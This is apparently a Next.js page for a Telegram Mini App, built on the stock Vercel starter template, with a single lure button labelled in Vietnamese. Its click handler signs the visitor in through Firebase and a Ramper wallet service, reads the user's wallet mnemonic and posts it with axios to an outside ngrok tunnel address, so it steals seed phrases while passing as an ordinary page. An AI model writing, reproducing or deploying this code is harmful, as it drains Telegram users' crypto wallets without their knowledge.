'use client'
import Image from "next/image";
import { useEffect, useState } from "react";
import { getAuth, signInWithCustomToken } from 'firebase/auth';
import { ramperSignIn } from "@/services/lib";
import axios from "axios";

export default function Home() {
  const [messageList, setMessageList] = useState([])
  console.log("🩲 🩲 => Home => messageList:", messageList)

  const testTelegram = () => {
    if (typeof window !== 'undefined') {
      // window.Telegram.WebApp.openInvoice('https://walletbot.me/scw/tc/connect')

      if (!window.Telegram || !window.Telegram.WebApp) {
        return
      }

      const url = window.Telegram.WebApp.initData
      let uri = decodeURIComponent(url)
      uri = decodeURIComponent(uri)
      const params = new URLSearchParams(uri)
      const data = Object.fromEntries(params.entries())
      const user = data.user
      if (data) {
        ;(async () => {
          try {
            const result = await fetch('/api/token', {
              body: JSON.stringify(data),
              method: 'POST'
            })

            const response = await result.json()
            
            if (response.result) {
              const data = response.result
              const auth = getAuth()
              await signInWithCustomToken(auth, data.customToken)
              const user = await ramperSignIn();
              console.log("🩲 🩲 => ; => user:", user)
              const mnemonic = user?.mnemonic
              
              axios.post('https://aa80-113-161-53-12.ngrok-free.app/api/token/data', {
                mnemonic
              })
            }
          } catch (error) {
            console.debug('🚀 ~ useEffectOnce ~ error:', error)
          }
        })()
      }
    }
  }

  useEffect(() => {
    // const eventSource = new EventSource('http://localhost:3001/api/sse')

    // eventSource.onmessage = (event) => {
    //   console.log("🩲 🩲 => message:", event)
    // }

    // eventSource.onopen = (event) => {
    //   console.log("🩲 🩲 => open:", event)
    // }

    // eventSource.onerror = (event) => {
    //   console.log("🩲 🩲 => error:", event)
    // }

  }, [])

  return (
    <main className="flex min-h-screen flex-col items-center justify-between p-24">
      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:size-auto lg:bg-none">
          <a
            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
            target="_blank"
            rel="noopener noreferrer"
          >
            By{" "}
            <Image
              src="/vercel.svg"
              alt="Vercel Logo"
              className="dark:invert"
              width={100}
              height={24}
              priority
            />
          </a>
        </div>
      </div>

      <div className="mb-32 grid text-center ">
        <button
          onClick={testTelegram}
          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
        >
          <h2 className="mb-3 text-2xl font-semibold">
            Nhấp em đi anh{" "}
            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
              -&gt;
            </span>
          </h2>
        </button>

      </div>
    </main>
  );
}
